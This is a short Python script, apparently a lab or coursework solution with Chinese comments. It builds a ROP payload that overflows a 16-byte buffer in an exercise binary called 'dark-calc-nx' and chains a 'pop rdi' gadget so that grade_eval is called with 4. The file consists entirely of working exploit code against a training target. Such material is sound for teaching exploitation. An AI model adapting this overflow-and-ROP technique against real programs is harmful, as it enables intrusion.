#!/usr/bin/env python3
"""Task 3: 用 ROP 让 dark-calc-nx 调用 grade_eval(4)。"""
import sys, struct

p64 = lambda x: struct.pack("<Q", x)

payload  = b"A" * 16                    # expression[16]
payload += p64(0)                       # saved rbp
payload += p64(0x401a33)                # pop rdi; ret
payload += p64(4)                       # grade = 4
payload += p64(0x401a34)                # ret（栈对齐）
payload += p64(0x401978)                # grade_eval
payload += p64(0x4141414141414141)      # grade_eval 返回后的落点 → 段错误

sys.stdout.buffer.write(payload)
